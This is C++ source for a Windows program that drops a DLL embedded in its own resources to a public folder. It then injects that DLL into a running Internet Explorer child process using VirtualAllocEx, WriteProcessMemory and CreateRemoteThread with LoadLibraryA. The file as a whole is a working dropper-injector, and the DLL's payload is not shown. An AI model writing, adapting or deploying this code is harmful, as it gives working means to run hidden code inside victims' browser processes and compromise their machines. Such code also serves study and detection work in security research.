#include <iostream>
#include <windows.h>
#include "resource1.h"
#include "tlhelp32.h"
#include "tchar.h"
#include "wchar.h"

struct Resource {
	size_t size = 0;
	void* ptr = nullptr;
};

Resource GetDllResource()
{
	int resource_id = IDR_RCDATA1;

	HRSRC hResource = nullptr;
	HGLOBAL hMemory = nullptr;
	Resource r;
	hResource = FindResource(nullptr, MAKEINTRESOURCE(resource_id), RT_RCDATA);
	hMemory = LoadResource(nullptr, hResource);
	r.size = SizeofResource(nullptr, hResource);
	r.ptr = LockResource(hMemory);

	return r;
}

std::string DLLDropPath()
{
	return "C:\\Users\\Public\\hp.dll";
}

int DropDll(std::string dllPath)
{
	Resource r = GetDllResource();

	HANDLE hFile;
	DWORD dwBytesToWrite = (DWORD)r.size;
	DWORD dwBytesWritten = 0;
	BOOL bErrorFlag = FALSE;

	hFile = CreateFileA(dllPath.data(),                // name of the write
		GENERIC_WRITE,          // open for writing
		0,                      // do not share
		NULL,                   // default security
		CREATE_ALWAYS,             // create new file only
		FILE_ATTRIBUTE_NORMAL,  // normal file
		NULL);                  // no attr. template

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("Report: Invalid handle :(\n");
		return 1;
	}

	//printf(TEXT("Writing %d bytes to %s.\n"), dwBytesToWrite, outfilepath);

	bErrorFlag = WriteFile(
		hFile,           // open file handle
		r.ptr,      // start of data to write
		dwBytesToWrite,  // number of bytes to write
		&dwBytesWritten, // number of bytes that were written
		NULL);            // no overlapped structure

	if (FALSE == bErrorFlag)
	{
		printf("Report: bErrorFlag = False :(\n");
		return 1;
	}
	else
	{
		if (dwBytesWritten != dwBytesToWrite)
		{
			// This is an error because a synchronous write that results in
			// success (WriteFile returns TRUE) should write all data as
			// requested. This would not necessarily be the case for
			// asynchronous writes.
			printf("Report: Error: dwBytesWritten != dwBytesToWrite\n");
			return 1;
		}
		else
		{
			//_tprintf(TEXT("Wrote %d bytes to %s successfully.\n"), dwBytesWritten, argv[1]);
		}
	}

	CloseHandle(hFile);

	return 0;

}

/* Load DLL into remote process
* Gets LoadLibraryA address from current process, which is guaranteed to be same for single boot session across processes
* Allocated memory in remote process for DLL path name
* CreateRemoteThread to run LoadLibraryA in remote process. Address of DLL path in remote memory as argument
*/
BOOL loadRemoteDLL(HANDLE hProcess, const char* dllPath) {
	// Allocate memory for DLL's path name to remote process
	LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (dllPathAddressInRemoteMemory == NULL) {
		printf("[---] VirtualAllocEx unsuccessful.\n");
		getchar();
		return FALSE;
	}

	// Write DLL's path name to remote process
	BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);

	if (!succeededWriting) {
		printf("[---] WriteProcessMemory unsuccessful.\n");
		getchar();
		return FALSE;
	}
	else {
		// Returns a pointer to the LoadLibrary address. This will be the same on the remote process as in our current process.
		LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
		if (loadLibraryAddress == NULL) {
			printf("[---] LoadLibrary not found in process.\n");
			getchar();
			return FALSE;
		}
		else {
			HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, NULL, NULL);
			if (remoteThread == NULL) {
				printf("[---] CreateRemoteThread unsuccessful.\n");
				return FALSE;
			}
		}
	}

	CloseHandle(hProcess);
	return TRUE;
}

bool hasEnding(std::string const& fullString, std::string const& ending) {
	if (fullString.length() >= ending.length()) {
		return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
	}
	else {
		return false;
	}
}

bool IsIEProcess(DWORD pid)
{
	HANDLE parenthandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (parenthandle == NULL)
		return false;
	char exePath[MAX_PATH];
	DWORD size = 10240;
	QueryFullProcessImageNameA(parenthandle, 0, exePath, &size);
	return hasEnding(std::string(exePath), std::string("iexplore.exe"));
}

void InjectIEProcess(std::string dllPath)
{
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		printf("[---] Could not create snapshot.\n");
	}

	// Set the size of the structure before using it.
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return;
	}

	// Now walk the snapshot of processes, and
	// display information about each process in turn
	do
	{
		// Is an Intenet Explorer child process
		if (IsIEProcess(pe32.th32ProcessID) && IsIEProcess(pe32.th32ParentProcessID))
		{
			hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			if (hProcess != NULL)
			{
				loadRemoteDLL(hProcess, dllPath.c_str());
				printf("[+] Injected!.\n");
				// Inject only into the first one
				return;
			}
			else
			{
				printf("[---] Failed to open process to inject into.\n");
				return;
			}
		}
	} while (Process32Next(hProcessSnap, &pe32));

	printf("[---] No Internet Explorer child process found, aborting.\n");
	return;
}

int main()
{
	std::string dllPath = DLLDropPath();
	int res = DropDll(dllPath);
	if (res == 0)
		InjectIEProcess(dllPath);
}
